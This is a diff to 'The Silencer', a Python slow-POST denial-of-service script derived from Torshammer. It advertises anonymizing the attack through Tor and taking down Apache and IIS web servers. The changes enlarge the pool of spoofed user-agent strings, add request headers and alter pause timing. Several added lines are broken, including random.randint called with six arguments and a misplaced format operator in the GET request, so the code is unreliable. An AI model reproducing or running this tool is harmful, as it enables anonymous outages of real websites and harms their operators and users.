@@ -1,5 +1,6 @@
 #!/usr/bin/python
 """
+ANY REDISTRIBUTION OR MODIFIED PACKAGE MUST CONTAIN THE FOLLOWING NOTICE!
 The Silencer: https://github.com/haigiang02/the-silencer
 Based on : https://sourceforge.net/projects/torshammer
 
@@ -7,10 +8,10 @@ The Silencer is a slow post dos testing tool written in Python.
 It can also be run through the Tor network to be anonymized.
 If you are going to run it with Tor it assumes you are running Tor on 127.0.0.1:9150. 
 Kills most unprotected web servers running Apache and IIS via a single instance.
-Kills Apache 1.X and older IIS with ~128 threads.
-Kills newer IIS and Apache 2.X with ~256 threads.
+Kills Apache 1.X and older IIS with ~100 threads.
+Kills newer IIS and Apache 2.X with ~200 threads.
 
-Modded by haigiang02 from zunzutech.com
+Modded by haigiang02 from zunzutech.com/Insane Developer from HF
 """
 import os,re,time,sys,random,math,getopt,socks,string,terminal
 from threading import Thread
@@ -29,7 +30,7 @@ useragents = [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
  "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
  "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
- "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
+ "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
  "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
@@ -38,6 +39,13 @@ useragents = [
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
  "AbachoBOT (Mozilla compatible)",
+ "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
+ "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
+ "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
+ "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
+ "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
+ "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)",
+ "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
@@ -45,6 +53,25 @@ useragents = [
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
  "DoCoMo/1.0/P502i/c10 (Google CHTML Proxy/1.0)",
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
+ "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+ "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+ "Opera/9.20 (Windows NT 6.0; U; en)",
+ "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
+ "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
+ "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
+ "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
+ "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
+ "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
+ "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
+ "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
+ "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+ "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
+ "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
+ "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",
+ "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
+ "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
@@ -82,7 +109,7 @@ class httpPost(Thread):
         self.socks = socks.socksocket()
         self.tor = tor
         self.running = True
-    def _send_http_post(self, pause=random.randint(5,10)): 
+    def _send_http_post(self, pause=random.randint(6,10,11,12,7,5)): 
         global stop_now
         self.socks.send("POST / HTTP/1.1\r\n"
                         "Host: %s\r\n"
@@ -91,10 +118,11 @@ class httpPost(Thread):
                         "Referer: %s\r\n"
                         "Cookie: %s\r\n"
                         "Keep-Alive: %s\r\n" 
+                        "Cache-Control: no-cache\r\n"
                         "Content-Length: 99768\r\n"
                         "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                         (self.host, random.randint(useragents), random.randint(300, 894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
-    def _send_http_get(self, pause=random.randint(5,10)):
+    def _send_http_get(self, pause=random.randint(6,10,11,12,7,5)):
         global stop_now
         self.socks.send("GET / HTTP/1.1\r\n"
 			"Host: %s\r\n"
@@ -104,6 +132,7 @@ class httpPost(Thread):
 			"Accept-Encoding: gzip\r\n"
 			"Accept-Language: en\r\n"
 			"Referer: %s\r\n"
+			"Window-Size: 0\r\n\r\n" %
 			"Cookie: %s\r\n" %
 			(self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
     def _send_http_head(self, pause=random.randint(5,10)):
